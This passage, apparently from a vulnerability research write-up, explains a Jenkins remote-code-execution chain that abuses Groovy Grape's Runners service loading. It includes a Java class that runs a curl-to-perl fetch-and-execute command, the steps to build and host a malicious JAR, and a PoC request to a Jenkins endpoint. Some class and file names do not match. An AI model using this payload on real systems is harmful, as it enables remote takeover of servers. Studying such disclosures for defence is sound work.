@@ -1,0 +1,70 @@
+In the exploitation, the target is always escalating the read primitive or write primitive to code execution! From the previous section, we can write malicious JAR file into remote Jenkins server by Grape. However, the next problem is how to execute code?
+
+By diving into Grape implementation on Groovy, we realized the library fetching is done by the class groovy.grape.GrapeIvy! We started to find is there any way we can leverage, and we noticed an interesting method processOtherServices(…)!
+
+void processOtherServices(ClassLoader loader, File f) {
+    try {
+        ZipFile zf = new ZipFile(f)
+        ZipEntry serializedCategoryMethods = zf.getEntry("META-INF/services/org.codehaus.groovy.runtime.SerializedCategoryMethods")
+        if (serializedCategoryMethods != null) {
+            processSerializedCategoryMethods(zf.getInputStream(serializedCategoryMethods))
+        }
+        ZipEntry pluginRunners = zf.getEntry("META-INF/services/org.codehaus.groovy.plugins.Runners")
+        if (pluginRunners != null) {
+            processRunners(zf.getInputStream(pluginRunners), f.getName(), loader)
+        }
+    } catch(ZipException ignore) {
+        // ignore files we can't process, e.g. non-jar/zip artifacts
+        // TODO log a warning
+    }
+}
+
+JAR file is just a subset of ZIP format. In the processOtherServices(…), Grape registers servies if there are some specified entry points. Among them, the Runner interests me. By looking into the implementation of processRunners(…), we found this:
+
+void processRunners(InputStream is, String name, ClassLoader loader) {
+    is.text.readLines().each {
+        GroovySystem.RUNNER_REGISTRY[name] = loader.loadClass(it.trim()).newInstance()
+    }
+}
+
+Here we see the newInstance(). Does it mean that we can call Constructor on any class? Yes, so, we can just create a malicious JAR file, and put the class name into the file META-INF/services/org.codehaus.groovy.plugins.Runners and we can invoke the Constructor and execute arbitrary code!
+
+Here is the full exploit:
+
+public class Poc {
+    public Poc(){
+        try {
+            String payload = "curl orange.tw/bc.pl | perl -";
+            String[] cmds = {"/bin/bash", "-c", payload};
+            java.lang.Runtime.getRuntime().exec(cmds);
+        } catch (Exception e) { }
+
+    }
+}
+
+
+$ javac Orange.java
+$ mkdir -p META-INF/services/
+$ echo Orange > META-INF/services/org.codehaus.groovy.plugins.Runners
+$ find .
+./Orange.java
+./Orange.class
+./META-INF
+./META-INF/services
+./META-INF/services/org.codehaus.groovy.plugins.Runners
+
+$ jar cvf poc-1.jar tw/
+$ cp poc-1.jar ~/www/tw/orange/poc/1/
+$ curl -I http://[your_host]/tw/orange/poc/1/poc-1.jar
+HTTP/1.1 200 OK
+Date: Sat, 02 Feb 2019 11:10:55 GMT
+...
+
+PoC:
+
+http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
+?value=
+@GrabConfig(disableChecksums=true)%0a
+@GrabResolver(name='orange.tw', root='http://[your_host]/')%0a
+@Grab(group='tw.orange', module='poc', version='1')%0a
+import Orange;
